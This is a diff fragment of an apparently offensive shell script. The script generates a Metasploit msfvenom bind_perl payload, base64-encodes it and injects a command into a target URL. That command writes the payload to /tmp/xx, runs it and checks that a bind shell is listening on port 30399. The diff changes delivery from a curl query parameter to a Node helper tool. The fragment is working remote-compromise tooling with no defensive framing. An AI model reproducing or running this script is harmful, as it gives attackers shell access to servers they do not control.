@@ -12,14 +12,17 @@
 # linux/x86/shell/bind_tcp
 lport="30399"
 echo "wait msfvenom ..."
-xxP=`msfvenom -p cmd/unix/bind_perl lport=${lport} -f raw 2>/dev/null|base64`
+xxP=`msfvenom -p cmd/unix/bind_perl lport=${lport} -f raw 2>/dev/null|base64|tr -d "\n"`
 # netstat -antp|grep ${lport}|grep -Eo \"[0-9]{1,}/perl\"|sed 's/\/perl//g'|xargs -I % kill -9 %;
 szTmp1="echo \"${xxP}\"|base64 -d >/tmp/xx;chmod +x /tmp/xx;/tmp/xx;netstat -antp|grep ${lport}"
-xxP1=`urlencode2 "${szTmp1}"`
+# xxP1=`urlencode2 "${szTmp1}"`
 url="$1"
-url2="${url}?ls=${xxP1}"
+# url2="${url}?ls=${xxP1}"
 echo "wait remoute run cmd/unix/bind_perl"
-chkRst=`curl -k -s -q "${url2}"`
+szCmd="node tools/doCmdIps.js --url ${url}  -c '${szTmp1}'"
+# echo $szCmd
+chkRst=`$szCmd`
+# chkRst=`curl -k -s -q "${url2}"`
 echo "result:[${chkRst}]"
 if [ "${chkRst}" != "" ];
 then
